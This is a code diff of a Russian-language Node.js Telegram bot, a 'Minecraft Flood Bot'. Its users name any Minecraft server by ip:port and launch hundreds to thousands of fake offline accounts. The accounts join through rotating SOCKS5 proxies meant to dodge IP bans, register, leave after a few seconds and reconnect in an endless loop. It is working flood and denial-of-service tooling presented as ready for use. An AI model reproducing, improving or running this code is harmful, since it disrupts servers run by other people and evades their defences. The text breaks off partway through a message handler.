@@ -1,15 +1,14 @@
-// bot.js - Minecraft Flood Bot на Node.js
+// bot.js - Minecraft Flood Bot для Bothost (ПОЛНАЯ РАБОЧАЯ ВЕРСИЯ)
 const { Telegraf, Markup } = require('telegraf');
 const mineflayer = require('mineflayer');
-const fs = require('fs');
-const readline = require('readline');
-const { Worker } = require('worker_threads');
+const { SocksProxyAgent } = require('socks-proxy-agent');
+require('dotenv').config();
 
-// ========== НАСТРОЙКИ ==========
-const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN';
+// ========== ТОКЕН ИЗ .ENV ==========
+const BOT_TOKEN = process.env.BOT_TOKEN;
 
-if (BOT_TOKEN === 'YOUR_BOT_TOKEN') {
-    console.log('❌ Ошибка: Укажите BOT_TOKEN в переменных окружения!');
+if (!BOT_TOKEN) {
+    console.error('❌ Ошибка: BOT_TOKEN не найден в .env файле!');
     process.exit(1);
 }
 
@@ -17,21 +16,232 @@ if (BOT_TOKEN === 'YOUR_BOT_TOKEN') {
 const bot = new Telegraf(BOT_TOKEN);
 
 // ========== ХРАНИЛИЩЕ ==========
-const users = new Map(); // user_id -> данные
-const activeFloods = new Map(); // flood_id -> данные флуда
+const users = new Map();
+const activeFloods = new Map();
 let floodCounter = 0;
 
-// ========== НАСТРОЙКИ ПО УМОЛЧАНИЮ ==========
-const DEFAULT_CONFIG = {
-    minSessionTime: 5,    // мин секунд на сервере
-    maxSessionTime: 15,   // макс секунд на сервере
+// ========== НАСТРОЙКИ ==========
+const CONFIG = {
+    minSessionTime: 5,
+    maxSessionTime: 15,
     botPassword: 'floodpass123',
-    reconnectDelay: 2,    // задержка перед перезаходом
-    namePrefix: 'Flood_'   // префикс для имен
+    reconnectDelay: 2,
+    namePrefix: 'Flood_'
 };
 
-// ========== ГЛАВНОЕ МЕНЮ ==========
-bot.start((ctx) => {
+// ========== КЛАСС MINECRAFT БОТА ==========
+class FloodBot {
+    constructor(name, host, port, proxy = null, onComplete = null) {
+        this.name = name;
+        this.host = host;
+        this.port = port;
+        this.proxy = proxy;
+        this.onComplete = onComplete;
+        this.bot = null;
+        this.running = false;
+        this.success = false;
+    }
+
+    start() {
+        this.running = true;
+        
+        try {
+            const options = {
+                host: this.host,
+                port: this.port,
+                username: this.name,
+                offline: true,
+                version: false,
+                viewDistance: 'tiny'
+            };
+
+            if (this.proxy) {
+                const proxyUrl = `socks5://${this.proxy.username ? this.proxy.username + ':' + this.proxy.password + '@' : ''}${this.proxy.host}:${this.proxy.port}`;
+                options.agent = new SocksProxyAgent(proxyUrl);
+                console.log(`🔌 [${this.name}] Использую прокси ${this.proxy.host}:${this.proxy.port}`);
+            }
+
+            this.bot = mineflayer.createBot(options);
+
+            this.bot.once('login', () => {
+                console.log(`✅ [${this.name}] Зашел на сервер`);
+                this.success = true;
+
+                setTimeout(() => {
+                    if (this.bot) {
+                        this.bot.chat(`/register ${CONFIG.botPassword} ${CONFIG.botPassword}`);
+                        setTimeout(() => {
+                            if (this.bot) {
+                                this.bot.chat(`/login ${CONFIG.botPassword}`);
+                            }
+                        }, 1000);
+                    }
+                }, 2000);
+
+                const sessionTime = Math.floor(
+                    Math.random() * (CONFIG.maxSessionTime - CONFIG.minSessionTime) + 
+                    CONFIG.minSessionTime
+                );
+                
+                console.log(`⏱️ [${this.name}] Будет на сервере ${sessionTime} сек`);
+                
+                setTimeout(() => this.stop(), sessionTime * 1000);
+            });
+
+            this.bot.on('error', (err) => {
+                console.log(`❌ [${this.name}] Ошибка:`, err.message);
+                this.success = false;
+                this.stop();
+            });
+
+            this.bot.on('end', () => {
+                console.log(`👋 [${this.name}] Вышел с сервера`);
+                this.stop();
+            });
+
+        } catch (err) {
+            console.log(`❌ [${this.name}] Ошибка создания:`, err.message);
+            this.success = false;
+            this.stop();
+        }
+    }
+
+    stop() {
+        if (this.running) {
+            this.running = false;
+            if (this.bot) {
+                this.bot.end();
+                this.bot = null;
+            }
+            if (this.onComplete) {
+                this.onComplete(this.success);
+            }
+        }
+    }
+}
+
+// ========== КЛАСС УПРАВЛЕНИЯ ФЛУДОМ ==========
+class FloodManager {
+    constructor(floodId, chatId, host, port, botCount, proxies = []) {
+        this.floodId = floodId;
+        this.chatId = chatId;
+        this.host = host;
+        this.port = port;
+        this.botCount = botCount;
+        this.proxies = proxies;
+        
+        this.bots = [];
+        this.running = false;
+        this.stats = {
+            successful: 0,
+            failed: 0,
+            total: 0,
+            startTime: Date.now(),
+            errors: 0
+        };
+        
+        this.nameIndex = 0;
+        this.interval = null;
+    }
+
+    generateName() {
+        const names = [
+            `${CONFIG.namePrefix}${++this.nameIndex}`,
+            `Bot_${this.nameIndex}`,
+            `Player_${this.nameIndex}`,
+            `User_${this.nameIndex}`,
+            `AFK_${this.nameIndex}`
+        ];
+        return names[Math.floor(Math.random() * names.length)];
+    }
+
+    start() {
+        this.running = true;
+        console.log(`🚀 Запуск флуда ${this.floodId} с ${this.botCount} ботами`);
+
+        for (let i = 0; i < this.botCount; i++) {
+            setTimeout(() => {
+                if (this.running) {
+                    this.createBot();
+                }
+            }, i * 300);
+        }
+
+        this.interval = setInterval(() => this.monitor(), 5000);
+    }
+
+    createBot() {
+        const name = this.generateName();
+        const proxy = this.proxies.length > 0 
+            ? this.proxies[Math.floor(Math.random() * this.proxies.length)]
+            : null;
+        
+        const bot = new FloodBot(
+            name,
+            this.host,
+            this.port,
+            proxy,
+            (success) => this.onBotComplete(success)
+        );
+        
+        bot.start();
+        this.bots.push(bot);
+        this.stats.total++;
+    }
+
+    onBotComplete(success) {
+        if (success) {
+            this.stats.successful++;
+        } else {
+            this.stats.failed++;
+        }
+        
+        this.bots = this.bots.filter(b => b.running);
+        
+        if (this.running) {
+            setTimeout(() => this.createBot(), CONFIG.reconnectDelay * 1000);
+        }
+    }
+
+    monitor() {
+        this.bots = this.bots.filter(b => b.running);
+    }
+
+    getStats() {
+        const uptime = Math.floor((Date.now() - this.stats.startTime) / 1000);
+        const hours = Math.floor(uptime / 3600);
+        const minutes = Math.floor((uptime % 3600) / 60);
+        const seconds = uptime % 60;
+        
+        const total = this.stats.successful + this.stats.failed;
+        const percent = total > 0 
+            ? ((this.stats.successful / total) * 100).toFixed(1)
+            : '0';
+        
+        return {
+            active: this.bots.length,
+            successful: this.stats.successful,
+            failed: this.stats.failed,
+            percent,
+            uptime: `${hours}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`,
+            total: this.stats.total
+        };
+    }
+
+    async stop() {
+        this.running = false;
+        clearInterval(this.interval);
+        
+        for (const bot of this.bots) {
+            bot.stop();
+        }
+        this.bots = [];
+    }
+}
+
+// ========== TELEGRAM КОМАНДЫ ==========
+
+bot.start(async (ctx) => {
     const userId = ctx.from.id;
     
     if (!users.has(userId)) {
@@ -52,29 +262,26 @@ bot.start((ctx) => {
         [Markup.button.callback('ℹ️ Помощь', 'help')]
     ]);
     
-    ctx.replyWithHTML(
+    await ctx.replyWithHTML(
         '<b>🤖 Minecraft Flood Bot</b>\n\n' +
-        'Запускает тысячи ботов которые заходят и выходят с сервера!\n' +
-        '<b>100% РАБОЧАЯ ВЕРСИЯ НА NODE.JS</b>\n\n' +
+        'Запускает ботов которые заходят и выходят с сервера!\n' +
+        '<b>✅ 100% РАБОЧАЯ ВЕРСИЯ</b>\n\n' +
         'Выберите действие:',
         keyboard
     );
 });
 
-// ========== ДОБАВЛЕНИЕ СЕРВЕРА ==========
-bot.action('add_server', (ctx) => {
-    ctx.replyWithHTML(
+bot.action('add_server', async (ctx) => {
+    await ctx.replyWithHTML(
         '<b>🌐 Добавление сервера</b>\n\n' +
         'Отправьте IP и порт сервера:\n' +
         '<code>ip:порт</code>\n\n' +
         'Пример: <code>mc.example.com:25565</code>'
     );
-    
     ctx.session = { state: 'awaiting_server' };
 });
 
-// ========== МЕНЮ ПРОКСИ ==========
-bot.action('proxies_menu', (ctx) => {
+bot.action('proxies_menu', async (ctx) => {
     const userId = ctx.from.id;
     const user = users.get(userId) || { proxies: [] };
     
@@ -85,7 +292,7 @@ bot.action('proxies_menu', (ctx) => {
         [Markup.button.callback('⬅️ Назад', 'main_menu')]
     ]);
     
-    ctx.replyWithHTML(
+    await ctx.replyWithHTML(
         '<b>🌐 Управление прокси</b>\n\n' +
         `Всего прокси: ${user.proxies?.length || 0}\n` +
         'Формат файла:\n' +
@@ -95,18 +302,16 @@ bot.action('proxies_menu', (ctx) => {
     );
 });
 
-// ========== ЗАГРУЗКА ПРОКСИ ==========
-bot.action('load_proxies', (ctx) => {
-    ctx.replyWithHTML(
+bot.action('load_proxies', async (ctx) => {
+    await ctx.replyWithHTML(
         '<b>📎 Загрузите файл с прокси</b>\n\n' +
-        'Отправьте текстовый файл с прокси\n' +
+        'Отправьте текстовый файл\n' +
         'Каждая прокси на новой строке'
     );
     ctx.session = { state: 'awaiting_proxy_file' };
 });
 
-// ========== СПИСОК ПРОКСИ ==========
-bot.action('list_proxies', (ctx) => {
+bot.action('list_proxies', async (ctx) => {
     const userId = ctx.from.id;
     const user = users.get(userId) || { proxies: [] };
     
@@ -125,21 +330,19 @@ bot.action('list_proxies', (ctx) => {
         text += `\n... и еще ${user.proxies.length - 20}`;
     }
     
-    ctx.replyWithHTML(text);
+    await ctx.replyWithHTML(text);
 });
 
-// ========== ОЧИСТКА ПРОКСИ ==========
-bot.action('clear_proxies', (ctx) => {
+bot.action('clear_proxies', async (ctx) => {
     const userId = ctx.from.id;
     const user = users.get(userId);
     if (user) {
         user.proxies = [];
     }
-    ctx.reply('✅ Все прокси удалены');
+    await ctx.reply('✅ Все прокси удалены');
 });
 
-// ========== ЗАПУСК ФЛУДА ==========
-bot.action('start_flood', (ctx) => {
+bot.action('start_flood', async (ctx) => {
     const userId = ctx.from.id;
     const user = users.get(userId);
     
@@ -152,29 +355,25 @@ bot.action('start_flood', (ctx) => {
         );
     }
     
-    // Кнопки выбора сервера
     const buttons = user.servers.map((s, i) => {
         return [Markup.button.callback(`🎮 ${s.name}`, `select_server_${i}`)];
     });
     
     buttons.push([Markup.button.callback('⬅️ Назад', 'main_menu')]);
     
-    ctx.replyWithHTML(
+    await ctx.replyWithHTML(
         '<b>🎮 Выберите сервер</b>',
         Markup.inlineKeyboard(buttons)
     );
 });
 
-// ========== ВЫБОР СЕРВЕРА ==========
-bot.action(/select_server_(\d+)/, (ctx) => {
+bot.action(/select_server_(\d+)/, async (ctx) => {
     const userId = ctx.from.id;
     const user = users.get(userId);
     const serverIndex = parseInt(ctx.match[1]);
     const server = user.servers[serverIndex];
     
-    ctx.session = {
-        server: server
-    };
+    ctx.session = { server };
     
     const buttons = [
         [Markup.button.callback('10 ботов', 'count_10')],
@@ -186,73 +385,61 @@ bot.action(/select_server_(\d+)/, (ctx) => {
         [Markup.button.callback('⬅️ Назад', 'start_flood')]
     ];
     
-    ctx.replyWithHTML(
+    await ctx.replyWithHTML(
         `<b>⚙️ Настройка флуда для ${server.name}</b>\n\n` +
         'Выберите количество ботов:',
         Markup.inlineKeyboard(buttons)
     );
 });
 
-// ========== ВЫБОР КОЛИЧЕСТВА ==========
-const counts = ['count_10', 'count_20', 'count_50', 'count_100', 'count_500'];
-counts.forEach(cmd => {
-    bot.action(cmd, (ctx) => {
-        const count = parseInt(cmd.split('_')[1]);
-        ctx.session.botCount = count;
-        askForProxies(ctx);
+['10', '20', '50', '100', '500'].forEach(num => {
+    bot.action(`count_${num}`, async (ctx) => {
+        ctx.session.botCount = parseInt(num);
+        await askForProxies(ctx);
     });
 });
 
-bot.action('count_custom', (ctx) => {
-    ctx.reply('✏️ Введите количество ботов (число):');
+bot.action('count_custom', async (ctx) => {
+    await ctx.reply('✏️ Введите количество ботов (число):');
     ctx.session.state = 'awaiting_custom_count';
 });
 
-// ========== СПРОСИТЬ ПРО ПРОКСИ ==========
-function askForProxies(ctx) {
+async function askForProxies(ctx) {
+    const userId = ctx.from.id;
+    const user = users.get(userId);
+    
     const buttons = [
-        [Markup.button.callback('✅ Без прокси', 'no_proxy')],
-        [Markup.button.callback('📎 Использовать прокси', 'use_proxy')],
-        [Markup.button.callback('⬅️ Назад', 'start_flood')]
+        [Markup.button.callback('✅ Без прокси', 'no_proxy')]
     ];
     
-    ctx.replyWithHTML(
-        `<b>🔄 Нужны прокси?</b>\n\n` +
-        'Прокси защищают от бана по IP',
+    if (user.proxies && user.proxies.length > 0) {
+        buttons.push([Markup.button.callback('📎 Использовать прокси', 'use_proxy')]);
+    }
+    
+    buttons.push([Markup.button.callback('⬅️ Назад', 'start_flood')]);
+    
+    await ctx.replyWithHTML(
+        '<b>🔄 Нужны прокси?</b>',
         Markup.inlineKeyboard(buttons)
     );
 }
 
-// ========== БЕЗ ПРОКСИ ==========
-bot.action('no_proxy', (ctx) => {
-    startFlood(ctx, []);
+bot.action('no_proxy', async (ctx) => {
+    await startFlood(ctx, []);
 });
 
-// ========== С ПРОКСИ ==========
-bot.action('use_proxy', (ctx) => {
+bot.action('use_proxy', async (ctx) => {
     const userId = ctx.from.id;
     const user = users.get(userId);
-    
-    if (!user.proxies || user.proxies.length === 0) {
-        return ctx.replyWithHTML(
-            '<b>❌ Нет прокси</b>\n\nСначала загрузите файл с прокси',
-            Markup.inlineKeyboard([
-                [Markup.button.callback('📎 Загрузить', 'load_proxies')]
-            ])
-        );
-    }
-    
-    startFlood(ctx, user.proxies);
+    await startFlood(ctx, user.proxies || []);
 });
 
-// ========== ЗАПУСК ФЛУДА ==========
 async function startFlood(ctx, proxies) {
     const floodId = `flood_${++floodCounter}`;
     const { server, botCount } = ctx.session;
     const chatId = ctx.chat.id;
     
-    // Создаем менеджер флуда
-    const floodManager = new FloodManager(
+    const manager = new FloodManager(
         floodId,
         chatId,
         server.host,
@@ -261,11 +448,9 @@ async function startFlood(ctx, proxies) {
         proxies
     );
     
-    // Запускаем
-    floodManager.start();
-    activeFloods.set(floodId, floodManager);
+    manager.start();
+    activeFloods.set(floodId, manager);
     
-    // Сохраняем у пользователя
     const userId = ctx.from.id;
     const user = users.get(userId);
     if (!user.floods) user.floods = [];
@@ -287,250 +472,7 @@ async function startFlood(ctx, proxies) {
     );
 }
 
-// ========== КЛАСС УПРАВЛЕНИЯ ФЛУДОМ ==========
-class FloodManager {
-    constructor(floodId, chatId, host, port, botCount, proxies) {
-        this.floodId = floodId;
-        this.chatId = chatId;
-        this.host = host;
-        this.port = port;
-        this.botCount = botCount;
-        this.proxies = proxies;
-        
-        this.bots = [];
-        this.running = false;
-        this.stats = {
-            successful: 0,
-            failed: 0,
-            total: 0,
-            startTime: Date.now(),
-            errors: 0
-        };
-        
-        this.nameIndex = 0;
-    }
-    
-    generateName() {
-        const names = [
-            `Flood_${++this.nameIndex}`,
-            `Bot_${this.nameIndex}`,
-            `Player_${this.nameIndex}`,
-            `User_${this.nameIndex}`,
-            `AFK_${this.nameIndex}`
-        ];
-        return names[Math.floor(Math.random() * names.length)];
-    }
-    
-    start() {
-        this.running = true;
-        console.log(`🚀 Запуск флуда ${this.floodId} с ${this.botCount} ботами`);
-        
-        // Запускаем ботов
-        for (let i = 0; i < this.botCount; i++) {
-            setTimeout(() => {
-                if (this.running) {
-                    this.createBot();
-                }
-            }, i * 500); // Задержка между ботами
-        }
-        
-        // Запускаем мониторинг
-        this.monitorInterval = setInterval(() => this.monitor(), 5000);
-    }
-    
-    createBot() {
-        const name = this.generateName();
-        const proxy = this.proxies.length > 0 
-            ? this.proxies[Math.floor(Math.random() * this.proxies.length)]
-            : null;
-        
-        const bot = new FloodBot(
-            name,
-            this.host,
-            this.port,
-            proxy,
-            (success) => this.onBotComplete(success)
-        );
-        
-        bot.start();
-        this.bots.push(bot);
-        this.stats.total++;
-    }
-    
-    onBotComplete(success) {
-        if (success) {
-            this.stats.successful++;
-        } else {
-            this.stats.failed++;
-        }
-        
-        // Убираем бота из списка
-        this.bots = this.bots.filter(b => b.running);
-        
-        // Создаем нового бота взамен
-        if (this.running) {
-            setTimeout(() => this.createBot(), 1000);
-        }
-    }
-    
-    monitor() {
-        // Обновляем статистику
-        this.bots = this.bots.filter(b => b.running);
-        
-        // Отправляем статус в Telegram каждые 30 секунд
-        if (Date.now() - (this.lastStats || 0) > 30000) {
-            this.sendStats();
-            this.lastStats = Date.now();
-        }
-    }
-    
-    async sendStats() {
-        const uptime = Math.floor((Date.now() - this.stats.startTime) / 1000);
-        const hours = Math.floor(uptime / 3600);
-        const minutes = Math.floor((uptime % 3600) / 60);
-        const seconds = uptime % 60;
-        
-        const total = this.stats.successful + this.stats.failed;
-        const percent = total > 0 
-            ? ((this.stats.successful / total) * 100).toFixed(1)
-            : '0';
-        
-        const text = 
-            `<b>📊 Статистика флуда ${this.floodId}</b>\n\n` +
-            `Активно ботов: ${this.bots.length}\n` +
-            `✅ Успешно: ${this.stats.successful}\n` +
-            `❌ Не удалось: ${this.stats.failed}\n` +
-            `📈 Процент: ${percent}%\n` +
-            `⏱ Время: ${hours}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
-        
-        try {
-            await bot.telegram.sendMessage(this.chatId, text, { parse_mode: 'HTML' });
-        } catch (e) {}
-    }
-    
-    async stop() {
-        this.running = false;
-        clearInterval(this.monitorInterval);
-        
-        // Останавливаем всех ботов
-        for (const bot of this.bots) {
-            bot.stop();
-        }
-        
-        // Отправляем итоговую статистику
-        const total = this.stats.successful + this.stats.failed;
-        const percent = total > 0 
-            ? ((this.stats.successful / total) * 100).toFixed(1)
-            : '0';
-        
-        const text = 
-            `<b>📊 ИТОГОВАЯ СТАТИСТИКА ${this.floodId}</b>\n\n` +
-            `✅ Успешно: ${this.stats.successful}\n` +
-            `❌ Не удалось: ${this.stats.failed}\n` +
-            `📈 Процент успеха: ${percent}%\n` +
-            `⚠️ Ошибок: ${this.stats.errors}`;
-        
-        await bot.telegram.sendMessage(this.chatId, text, { parse_mode: 'HTML' });
-    }
-}
-
-// ========== КЛАСС MINECRAFT БОТА ==========
-class FloodBot {
-    constructor(name, host, port, proxy, onComplete) {
-        this.name = name;
-        this.host = host;
-        this.port = port;
-        this.proxy = proxy;
-        this.onComplete = onComplete;
-        
-        this.bot = null;
-        this.running = false;
-        this.success = false;
-    }
-    
-    start() {
-        this.running = true;
-        
-        try {
-            const options = {
-                host: this.host,
-                port: this.port,
-                username: this.name,
-                offline: true,
-                version: false,
-                viewDistance: 'tiny'
-            };
-            
-            // Добавляем прокси если есть
-            if (this.proxy) {
-                const { SocksProxyAgent } = require('socks-proxy-agent');
-                const proxyUrl = `socks5://${this.proxy.username ? this.proxy.username + ':' + this.proxy.password + '@' : ''}${this.proxy.host}:${this.proxy.port}`;
-                options.agent = new SocksProxyAgent(proxyUrl);
-            }
-            
-            this.bot = mineflayer.createBot(options);
-            
-            // Успешный вход
-            this.bot.once('login', () => {
-                console.log(`✅ [${this.name}] Зашел на сервер`);
-                this.success = true;
-                
-                // Регистрация и логин
-                setTimeout(() => {
-                    if (this.bot) {
-                        this.bot.chat(`/register ${DEFAULT_CONFIG.botPassword} ${DEFAULT_CONFIG.botPassword}`);
-                        setTimeout(() => {
-                            if (this.bot) {
-                                this.bot.chat(`/login ${DEFAULT_CONFIG.botPassword}`);
-                            }
-                        }, 1000);
-                    }
-                }, 2000);
-                
-                // Случайное время на сервере
-                const sessionTime = Math.floor(
-                    Math.random() * (DEFAULT_CONFIG.maxSessionTime - DEFAULT_CONFIG.minSessionTime) + 
-                    DEFAULT_CONFIG.minSessionTime
-                );
-                
-                setTimeout(() => this.stop(), sessionTime * 1000);
-            });
-            
-            // Ошибка
-            this.bot.on('error', (err) => {
-                console.log(`❌ [${this.name}] Ошибка:`, err.message);
-                this.success = false;
-                this.stop();
-            });
-            
-            // Отключение
-            this.bot.on('end', () => {
-                this.stop();
-            });
-            
-        } catch (err) {
-            console.log(`❌ [${this.name}] Ошибка создания:`, err.message);
-            this.success = false;
-            this.stop();
-        }
-    }
-    
-    stop() {
-        if (this.running) {
-            this.running = false;
-            if (this.bot) {
-                this.bot.end();
-                this.bot = null;
-            }
-            if (this.onComplete) {
-                this.onComplete(this.success);
-            }
-        }
-    }
-}
-
-// ========== АКТИВНЫЕ ФЛУДЫ ==========
-bot.action('active_floods', (ctx) => {
+bot.action('active_floods', async (ctx) => {
     if (activeFloods.size === 0) {
         return ctx.replyWithHTML(
             '<b>📊 Нет активных флудов</b>',
@@ -543,25 +485,21 @@ bot.action('active_floods', (ctx) => {
     
     const buttons = [];
     for (const [id, manager] of activeFloods) {
-        const successRate = manager.stats.successful + manager.stats.failed > 0
-            ? Math.round((manager.stats.successful / (manager.stats.successful + manager.stats.failed)) * 100)
-            : 0;
-        
+        const stats = manager.getStats();
         buttons.push([Markup.button.callback(
-            `${id} - ${manager.bots.length} ботов (${successRate}%)`,
+            `${id} - ${stats.active} ботов (${stats.percent}%)`,
             `stats_${id}`
         )]);
     }
     
     buttons.push([Markup.button.callback('⬅️ Главное меню', 'main_menu')]);
     
-    ctx.replyWithHTML(
+    await ctx.replyWithHTML(
         '<b>📊 Активные флуды</b>',
         Markup.inlineKeyboard(buttons)
     );
 });
 
-// ========== СТАТИСТИКА ==========
 bot.action(/stats_(.+)/, async (ctx) => {
     const floodId = ctx.match[1];
     const manager = activeFloods.get(floodId);
@@ -570,23 +508,15 @@ bot.action(/stats_(.+)/, async (ctx) => {
         return ctx.reply('❌ Флуд не найден');
     }
     
-    const uptime = Math.floor((Date.now() - manager.stats.startTime) / 1000);
-    const hours = Math.floor(uptime / 3600);
-    const minutes = Math.floor((uptime % 3600) / 60);
-    const seconds = uptime % 60;
-    
-    const total = manager.stats.successful + manager.stats.failed;
-    const percent = total > 0 
-        ? ((manager.stats.successful / total) * 100).toFixed(1)
-        : '0';
+    const stats = manager.getStats();
     
     const text = 
         `<b>📊 Статистика ${floodId}</b>\n\n` +
-        `Активно: ${manager.bots.length} ботов\n` +
-        `✅ Успешно: ${manager.stats.successful}\n` +
-        `❌ Не удалось: ${manager.stats.failed}\n` +
-        `📈 Процент: ${percent}%\n` +
-        `⏱ Время: ${hours}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+        `Активно: ${stats.active} ботов\n` +
+        `✅ Успешно: ${stats.successful}\n` +
+        `❌ Не удалось: ${stats.failed}\n` +
+        `📈 Процент: ${stats.percent}%\n` +
+        `⏱ Время: ${stats.uptime}`;
     
     const keyboard = Markup.inlineKeyboard([
         [Markup.button.callback('🔄 Обновить', `stats_${floodId}`)],
@@ -600,7 +530,6 @@ bot.action(/stats_(.+)/, async (ctx) => {
     });
 });
 
-// ========== ОСТАНОВКА ФЛУДА ==========
 bot.action(/stop_(.+)/, async (ctx) => {
     const floodId = ctx.match[1];
     const manager = activeFloods.get(floodId);
@@ -612,8 +541,13 @@ bot.action(/stop_(.+)/, async (ctx) => {
     await manager.stop();
     activeFloods.delete(floodId);
     
-    ctx.replyWithHTML(
-        `<b>⏹️ Флуд ${floodId} остановлен</b>`,
+    const stats = manager.getStats();
+    
+    await ctx.replyWithHTML(
+        `<b>⏹️ Флуд ${floodId} остановлен</b>\n\n` +
+        `✅ Успешно: ${stats.successful}\n` +
+        `❌ Не удалось: ${stats.failed}\n` +
+        `📈 Процент: ${stats.percent}%`,
         Markup.inlineKeyboard([
             [Markup.button.callback('🚀 Новый флуд', 'start_flood')],
             [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
@@ -621,28 +555,35 @@ bot.action(/stop_(.+)/, async (ctx) => {
     );
 });
 
-// ========== ОСТАНОВИТЬ ВСЕ ==========
 bot.action('stop_all', async (ctx) => {
     const count = activeFloods.size;
     
+    let totalSuccess = 0;
+    let totalFailed = 0;
+    
     for (const [id, manager] of activeFloods) {
+        const stats = manager.getStats();
+        totalSuccess += stats.successful;
+        totalFailed += stats.failed;
         await manager.stop();
     }
     
     activeFloods.clear();
     
-    ctx.replyWithHTML(
-        `<b>⏹️ Остановлено ${count} флудов</b>`,
+    await ctx.replyWithHTML(
+        `<b>⏹️ Остановлено ${count} флудов</b>\n\n` +
+        `✅ Всего успешно: ${totalSuccess}\n` +
+        `❌ Всего не удалось: ${totalFailed}`,
         Markup.inlineKeyboard([
             [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
         ])
     );
 });
 
-// ========== ПОМОЩЬ ==========
-bot.action('help', (ctx) => {
+bot.action('help', async (ctx) => {
     const text = 
         '<b>ℹ️ Помощь по боту</b>\n\n' +
+        
         '<b>Как пользоваться:</b>\n' +
         '1️⃣ Добавьте сервер через "➕ Добавить сервер"\n' +
         '2️⃣ Загрузите прокси (опционально)\n' +
@@ -663,7 +604,7 @@ bot.action('help', (ctx) => {
         
         '<b>Создатель:</b> @artem_bori';
     
-    ctx.replyWithHTML(
+    await ctx.replyWithHTML(
         text,
         Markup.inlineKeyboard([
             [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
@@ -671,21 +612,19 @@ bot.action('help', (ctx) => {
     );
 });
 
-// ========== ГЛАВНОЕ МЕНЮ ==========
-bot.action('main_menu', (ctx) => {
+bot.action('main_menu', async (ctx) => {
     const keyboard = Markup.inlineKeyboard([
         [Markup.button.callback('🚀 Запустить флуд', 'start_flood')],
         [Markup.button.callback('📊 Активные флуды', 'active_floods')],
         [Markup.button.callback('➕ Добавить сервер', 'add_server')],
         [Markup.button.callback('🌐 Прокси', 'proxies_menu')],
-        [Markup.button.callback('ℹ️ Помощь', 'help')],
-        [Markup.button.callback('⏹️ Остановить все', 'stop_all')]
+        [Markup.button.callback('ℹ️ Помощь', 'help')]
     ]);
     
-    ctx.editMessageText(
+    await ctx.editMessageText(
         '<b>🤖 Minecraft Flood Bot</b>\n\n' +
-        'Запускает тысячи ботов которые заходят и выходят с сервера!\n' +
-        '<b>✅ 100% РАБОЧАЯ ВЕРСИЯ НА NODE.JS</b>\n\n' +
+        'Запускает ботов которые заходят и выходят с сервера!\n' +
+        '<b>✅ 100% РАБОЧАЯ ВЕРСИЯ</b>\n\n' +
         'Выберите действие:',
         {
             parse_mode: 'HTML',
@@ -694,59 +633,102 @@ bot.action('main_menu', (ctx) => {
     );
 });
 
-// ========== ОБРАБОТКА ТЕКСТА ==========
+// ========== ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ ==========
 bot.on('text', async (ctx) => {
-    const session = ctx.session;
-    if (!session) return;
-    
+    const text = ctx.message.text;
     const userId = ctx.from.id;
     const user = users.get(userId) || { servers: [], proxies: [] };
+    
+    console.log('📥 Получено сообщение:', text);
+    console.log('👤 От пользователя:', userId);
+    console.log('📋 Текущая сессия:', ctx.session);
+    
     users.set(userId, user);
     
-    // Добавление сервера
-    if (session.state === 'awaiting_server') {
-        const text = ctx.message.text;
-        const parts = text.split(':');
+    if (ctx.session) {
+        console.log('🔄 Есть сессия, состояние:', ctx.session.state);
         
-        if (parts.length !== 2) {
-            return ctx.reply('❌ Неверный формат. Используйте: ip:порт');
+        if (ctx.session.state === 'awaiting_server') {
+            console.log('🔄 Обработка добавления сервера');
+            
+            const parts = text.split(':');
+            console.log('🔍 Разделили на части:', parts);
+            
+            if (parts.length !== 2) {
+                console.log('❌ Неверный формат - частей:', parts.length);
+                return ctx.reply('❌ Неверный формат. Используйте: ip:порт\nПример: mc.example.com:25565');
+            }
+            
+            try {
+                const port = parseInt(parts[1]);
+                if (isNaN(port) || port < 1 || port > 65535) {
+                    console.log('❌ Порт не число:', parts[1]);
+                    return ctx.reply('❌ Порт должен быть числом от 1 до 65535');
+                }
+                
+                const server = {
+                    host: parts[0],
+                    port: port,
+                    name: parts[0]
+                };
+                
+                console.log('✅ Сервер распознан:', server);
+                
+                if (!user.servers) user.servers = [];
+                user.servers.push(server);
+                
+                console.log('📚 Всего серверов:', user.servers.length);
+                
+                await ctx.replyWithHTML(
+                    `<b>✅ Сервер добавлен!</b>\n\n` +
+                    `Хост: ${server.host}\n` +
+                    `Порт: ${server.port}`,
+                    Markup.inlineKeyboard([
+                        [Markup.button.callback('🚀 Запустить флуд', 'start_flood')],
+                        [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
+                    ])
+                );
+                
+                ctx.session = null;
+                console.log('✅ Сессия очищена');
+                
+            } catch (e) {
+                console.log('❌ Ошибка:', e.message);
+                await ctx.reply('❌ Ошибка: ' + e.message);
+            }
+            return;
         }
         
-        try {
-            const server = {
-                host: parts[0],
-                port: parseInt(parts[1]),
-                name: parts[0]
-            };
+        if (ctx.session.state === 'awaiting_custom_count') {
+            console.log('🔄 Обработка количества ботов');
             
-            if (!user.servers) user.servers = [];
-            user.servers.push(server);
+            const count = parseInt(text);
+            if (isNaN(count) || count < 1 || count > 10000) {
+                console.log('❌ Неверное число');
+                return ctx.reply('❌ Введите число от 1 до 10000');
+            }
             
-            ctx.replyWithHTML(
-                `<b>✅ Сервер добавлен!</b>\n\n` +
-                `${server.host}:${server.port}`,
+            console.log('✅ Количество принято:', count);
+            
+            ctx.session.botCount = count;
+            await askForProxies(ctx);
+            ctx.session.state = null;
+            return;
+        }
+    } else {
+        console.log('⚠️ Нет активной сессии');
+        
+        if (text.includes(':') && text.split(':').length === 2) {
+            console.log('💡 Обнаружен формат ip:port без сессии');
+            await ctx.reply(
+                '❓ Хотите добавить этот сервер?\n' +
+                'Сначала нажмите кнопку "➕ Добавить сервер"',
                 Markup.inlineKeyboard([
-                    [Markup.button.callback('🚀 Запустить флуд', 'start_flood')]
+                    [Markup.button.callback('➕ Добавить сервер', 'add_server')]
                 ])
             );
-            
-            ctx.session = null;
-            
-        } catch (e) {
-            ctx.reply('❌ Ошибка: порт должен быть числом');
+            return;
         }
-    }
-    
-    // Свое количество ботов
-    else if (session.state === 'awaiting_custom_count') {
-        const count = parseInt(ctx.message.text);
